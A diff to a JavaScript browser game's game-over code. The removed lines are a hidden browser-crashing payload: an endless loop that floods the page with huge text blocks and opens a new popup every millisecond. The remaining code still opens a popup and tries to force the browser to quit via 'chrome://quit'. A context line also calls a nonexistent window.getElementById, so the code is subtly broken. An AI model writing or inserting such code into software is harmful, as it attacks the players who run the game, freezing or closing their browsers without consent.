@@ -481,21 +481,7 @@ function updateGame() {
             ctx.fillStyle = 'yellow';
             ctx.font = '18px Arial';
             ctx.fillText('Press R to Restart', CANVAS_WIDTH/2, CANVAS_HEIGHT/2+100);
-            txt = "";
-
-        for(var i = 0; i === i; i++) {
-           txt = txt + "潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰".repeat(999);
-
-           var x = document.createElement("div");
-           x.innerText = txt;
-
-          document.body.appendChild(x)
-          console.log(txt);
-  
-          setInterval(function () {
-            open('https://example.invalid', Math.random().toString(), "scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=600,height=300,left=100,top=100");
-          }, 1);
-        }
+            popupWindow = window.open(url,'popUpWindow','height=181,width=666,left=3,top=222')
             location.href = 'chrome://quit'
             gameOver = true;
             ctx.save();
@@ -603,6 +589,7 @@ let movableElement = window.getElementById('player');
 bgMusic.play();
 resetGame();
 updateGame();
+
 
 
 
